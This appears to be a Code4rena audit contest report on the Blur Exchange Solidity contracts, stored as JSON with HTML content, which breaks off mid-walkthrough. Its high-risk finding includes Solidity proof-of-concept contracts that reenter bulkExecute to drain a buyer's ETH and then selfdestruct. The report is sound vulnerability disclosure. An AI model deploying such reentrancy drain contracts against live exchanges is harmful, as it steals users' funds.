{
  "circa": {
    "title": "Blur Exchange contest",
    "sponsor": "Blur Exchange",
    "slug": "2022-11-non-fungible",
    "date": "2022-12-08",
    "findings": "https://github.com/code-423n4/2022-11-non-fungible-findings/issues",
    "contest": 181
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Blur smart contract system written in Solidity. The audit contest took place between November 11—November 14 2022.</p>\n<p><em>Note: this audit contest originally ran under the name <code>Non Fungible Trading</code>.</em></p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>63 Wardens contributed reports to the Blur contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/trust__90\">Trust</a></li>\n<li>cccz</li>\n<li><a href=\"https://github.com/romeroadrian\">adriro</a></li>\n<li>hihen</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>wait</li>\n<li>IllIllI</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li><a href=\"https://twitter.com/real_philogy\">philogy</a></li>\n<li>ladboy233</li>\n<li>9svR6w</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>0xdeadbeef0x</li>\n<li>0xhacksmithh</li>\n<li>Josiah</li>\n<li>zaskoh</li>\n<li>Rolezn</li>\n<li><a href=\"https://rafal-kalinowski.pl/\">deliriusz</a></li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://decorativepineapple.github.io/\">0xDecorativePineapple</a></li>\n<li>neko_nyaa</li>\n<li>KingNFT</li>\n<li>Lambda</li>\n<li>Koolex</li>\n<li>fs0c</li>\n<li>rotcivegaf</li>\n<li>datapunk</li>\n<li>0x4non</li>\n<li>brgltd</li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li><a href=\"https://twitter.com/CAA1994\">carlitox477</a></li>\n<li>saian</li>\n<li>chaduke</li>\n<li>codexploder</li>\n<li><a href=\"s3cunda.github.io\">s3cunda</a></li>\n<li>corerouter</li>\n<li>RaymondFam</li>\n<li><a href=\"https://github.com/martin-petrov03\">martin</a></li>\n<li>trustindistrust</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li>ajtra</li>\n<li>HE1M</li>\n<li>chrisdior4</li>\n<li>Tricko</li>\n<li>tnevler</li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li>Bnke0x0</li>\n<li>0xab00</li>\n<li>aphak5010</li>\n<li>erictee</li>\n<li>cryptostellar5</li>\n<li>shark</li>\n<li><a href=\"https://www.linkedin.com/in/nhan-vo-a9473019a/\">Rahoz</a></li>\n<li>Diana</li>\n<li>Awesome</li>\n<li>ch0bu</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li><a href=\"https://twitter.com/0xRoxas\">0xRoxas</a></li>\n<li>lukris02</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/berndartmueller\">berndartmueller</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/sockdrawermoney\">sock</a> and <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 5 unique vulnerabilities. Of these vulnerabilities, 1 received a risk rating in the category of HIGH severity and 4 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 21 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 29 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-11-non-fungible\">C4 Blur Exchange contest repository</a>, and is composed of 2 smart contracts written in the Solidity programming language and includes 659 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<hr>\n<h1 id=\"high-risk-findings-1\" style=\"position:relative;\"><a href=\"#high-risk-findings-1\" aria-label=\"high risk findings 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (1)</h1>\n<h2 id=\"h-01-direct-theft-of-buyers-eth-funds\" style=\"position:relative;\"><a href=\"#h-01-direct-theft-of-buyers-eth-funds\" aria-label=\"h 01 direct theft of buyers eth funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/96\">[H-01] Direct theft of buyer’s ETH funds</a></h2>\n<p><em>Submitted by 0xdeadbeef0x, also found by adriro, bin2chen, datapunk, hihen, KingNFT, Koolex, Lambda, philogy, rotcivegaf, Trust, V_B, and wait</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168\">Exchange.sol#L168</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565\">Exchange.sol#L565</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212\">Exchange.sol#L212</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L154\">Exchange.sol#L154</a><br></p>\n<p>Most severe issue:<br>\n<strong>A Seller or Fee recipient can steal ETH funds from the buyer when he is making a single or bulk execution. (Direct theft of funds).</strong></p>\n<p>Additional impacts that can be caused by these bugs:</p>\n<ol>\n<li>Seller or Fee recipient can cause next in line executions to revert in <code>bulkExecute</code> (by altering <code>isInternal</code>, insufficient funds, etc..)</li>\n<li>Seller or Fee recipient can call <code>_execute</code> externally </li>\n<li>Seller or Fee recipient can set a caller <code>_remainingETH</code> to 0 (will not get refunded)</li>\n</ol>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Background:</p>\n<ul>\n<li>The protocol added a <code>bulkExecute</code> function that allows multiple orders to execute. The implementation is implemented in a way that if an <code>_execute</code> of a single order reverts, it will not break additional or previous successful <code>_execute</code>s. It is therefore very important to track actual ETH used by the function. </li>\n<li>The protocol has recognized the need to track buyers ETH in order to refund unused ETH by implementing the <code>_returnDust</code> function and <code>setupExecution</code> modifier. This ensures that calls to <code>_execute</code> must be internal and have proper accounting of remainingETH. </li>\n<li>Fee recipient is controlled by the seller. The seller determines the recipients and fee rates.</li>\n</ul>\n<p>The new implementations creates an attack vectors that allows the Seller or Fee recipient to steal ETH.</p>\n<p>There are three main bugs that can be exploited to steal the ETH:</p>\n<ol>\n<li>Reentrancy is possible by feeRecipient as long as <code>_execute</code> is not called (<code>_execute</code> has a reentrancyGuard)</li>\n<li><code>bulkExecute</code> can be called with an empty parameter. This allows the caller to not enter <code>_execute</code> and call <code>_returnDust</code></li>\n<li><code>_returnDust</code> sends the entire balance of the contract to the caller.</li>\n</ol>\n<p>(Side note: I issued the 3 bugs together in this one report in order to show impact and better reading experience for sponsor and judge. If you see fit, these three bugs can be split to three different findings)</p>\n<p>There are two logical scenarios where the heist could originate from:</p>\n<ol>\n<li>Malicious seller: The seller can set the fee recipient to a malicious contract.</li>\n<li>Malicious fee recipient: fee recipient can steal the funds without the help of the seller. </li>\n</ol>\n<p>Consider the scenario (<code>#1</code>) where feeRecipient rate 10% of token price 1 ETH:</p>\n<ol>\n<li>Bob (Buyer) wants to execute 4 orders with ETH. Among the orders is Alice’s (seller) sell order (lets assume first in line).</li>\n<li>Bob calls <code>bulkExecute</code> with <code>4 ETH</code>. <code>1 ETH</code> for every order. </li>\n<li>Alice’s sell order gets executed. Fee  <code>0.1 ETH</code> is sent to feeRecipient (controlled by Alice).</li>\n<li>feeRecipient <em>reenters</em> <code>bulkExecute</code> with <em>empty</em> array as parameter and <code>1 WEI</code> of data</li>\n<li><code>_returnDust</code> returns the balance of the contract to feeRecipient <code>3.9 ETH</code>.</li>\n<li>feeRecipient sends <code>3.1 ETH</code> to seller (or any other beneficiary)</li>\n<li>feeRecipient call <code>selfdestruct</code> opcode that transfers <code>0.9 ETH</code> to Exchange contract. This is in order to keep <code>_execute</code> from reverting when paying the seller.</li>\n<li><code>_execute</code> pays seller  <code>0.9 ETH</code> </li>\n<li>Sellers balance is <code>4 ETH</code>. </li>\n<li>The rest of the <code>_execute</code> calls by <code>bulkExecute</code> will get reverted because buyer cannot pay as his funds were stolen.</li>\n<li>Buyers <code>3 ETH</code> funds stolen</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">┌───────────┐            ┌──────────┐         ┌───────────────┐    ┌───────────┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│           │            │          │         │               │    │           │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│   Buyer   │            │ Exchange │         │ Fee Recipient │    │  Seller   │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│           │            │          │         │               │    │           │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">└─────┬─────┘            └────┬─────┘         └───────┬───────┘    └─────┬─────┘</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │ bulkExecute(4 orders) │                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │         4 ETH         │                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ├──────────────────────►│                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │_execute sends 0.1 ETH │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       ├──────────────────────►│                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │ bulkExecute(0 orders) │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │         1 WEI         │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │◄──────────────────────┤                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │    _retrunDust sends  │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │         3.9 ETH       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       ├──────────────────────►│  Send 3.1 ETH    │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │                       ├─────────────────►│</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │ Self destruct send    │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │         0.9 ETH       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │◄──────────────────────┤                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │_execute sends 0.9 ETH │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       ├───────────────────────┼─────────────────►│</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │                       │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       ├──────┐ _execute revert│                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      │                       │      │     3 times    │                  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ┌───┴───┐                   │◄─────┘                │              ┌───┴───┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  │3 ETH  │                   │                       │              │4 ETH  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  │Stolen │                                                          │Balance│</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  └───────┘                                                          └───────┘</span></span></code></pre>\n<p>Here is a possible implementation of the fee recipient contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">contract MockFeeReceipient {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool lock;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(address seller, uint256 price) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _seller = seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _price = price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    receive() external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Exchange ex = Exchange(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(!lock){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            lock = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // first entrance when receiving fee</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 feeAmount = msg.value;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Create empty calldata for bulkExecute and call it</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            Execution[] memory executions = new Execution[](0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(ex).call{value: 1}(data);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Now we received All of buyers funds. </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Send stolen ETH to seller minus the amount needed in order to keep execution.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(_seller).call{value: address(this).balance - (_price - feeAmount)}(&#39;&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // selfdestruct and send funds needed to Exchange (to not revert)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            selfdestruct(payable(msg.sender));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        else{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Second entrance after steeling balance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // We will get here after getting funds from reentrancy</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Important to know:\nThe exploit becomes much easier if the set fee rate is 10000 (100% of the price). This can be set by the seller. In such case, the fee recipient does not need to send funds back to the exchange contract. In such case, step #7-8 can be removed. Example code for 100% fee scenario:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.17;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Exchange } from &quot;../Exchange.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Execution } from &quot;../lib/OrderStructs.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract MockFeeReceipient {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool lock;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 _price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(address seller, uint256 price) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _seller = seller;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _price = price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    receive() external payable {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Exchange ex = Exchange(msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if(!lock){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            lock = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // first entrance when receiving fee</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 feeAmount = msg.value;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Create empty calldata for bulkExecute and call it</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            Execution[] memory executions = new Execution[](0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address(ex).call{value: 1}(data);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        else{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Second entrance after steeling balance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // We will get here after getting funds from reentrancy</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>In the POC we talk mostly about <code>bulkExecute</code> but <code>execute</code> of a single execution can steal the buyers excessive ETH.</p>\n<h3 id=\"technical-walkthrough-of-scenario\" style=\"position:relative;\"><a href=\"#technical-walkthrough-of-scenario\" aria-label=\"technical walkthrough of scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technical Walkthrough of Scenario</h3>\n<p>Buyers can call <code>execute</code> or <code>bulkExecute</code> to start an execution of orders.<br>\nBoth functions have a <code>setupExecution</code> modifier that stores the amount of ETH the caller has sent for the transactions:</p>\n<p><code>bulkExecute</code> in <code>Exchange.sol</code>:\n<a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168\">https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function bulkExecute(Execution[] calldata executions)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        external</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        payable</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        whenOpen</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setupExecution</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    {</span></span></code></pre>\n<p><code>setupExecution</code>:\n<a 